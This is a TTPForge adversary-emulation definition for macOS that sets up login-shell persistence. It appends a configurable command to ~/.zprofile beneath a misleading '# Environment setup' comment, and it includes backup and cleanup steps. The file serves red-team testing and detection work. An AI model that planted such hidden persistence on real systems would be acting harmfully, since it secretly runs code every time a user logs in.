---
api_version: 2.0
uuid: 06d9a47d-4510-4fa6-a24d-f4274e452b5f
name: Modify ~/.zprofile
authors:
- TTPForge
description: |
  Modifies zsh profile initialization file for login shell persistence
mitre:
  tactics:
  - TA0003 Persistence
  techniques:
  - T1546 Event Triggered Execution
  subtechniques:
  - 'T1546.004 Event Triggered Execution: Unix Shell Configuration Modification'
requirements:
  platforms:
  - os: darwin
args:
- name: zprofile_path
  description: Path to zsh profile configuration file
  type: string
  default: ~/.zprofile
- name: backup_path
  description: Path to backup the original zprofile
  type: string
  default: ~/.zprofile.bak
- name: payload_command
  description: Command to inject into zprofile
  type: string
  default: /usr/bin/security add-generic-password -a user -s token -w malicious &
steps:
- name: backup_original_zprofile
  inline: cp {{ .Args.zprofile_path }} {{ .Args.backup_path }} 2>/dev/null || true
- name: inject_into_zprofile
  inline: |
    if [ ! -f "{{ .Args.zprofile_path }}" ]; then
      touch {{ .Args.zprofile_path }}
    fi
    echo "" >> {{ .Args.zprofile_path }}
    echo "# Environment setup" >> {{ .Args.zprofile_path }}
    echo "{{ .Args.payload_command }}" >> {{ .Args.zprofile_path }}
  cleanup:
    inline: |
      if [ -f "{{ .Args.backup_path }}" ]; then
        cp {{ .Args.backup_path }} {{ .Args.zprofile_path }}
        rm {{ .Args.backup_path }}
      else
        sed -i '' '/# Environment setup/,+1d' {{ .Args.zprofile_path }}
      fi
tests:
- name: dry_run_test
  dry_run: true
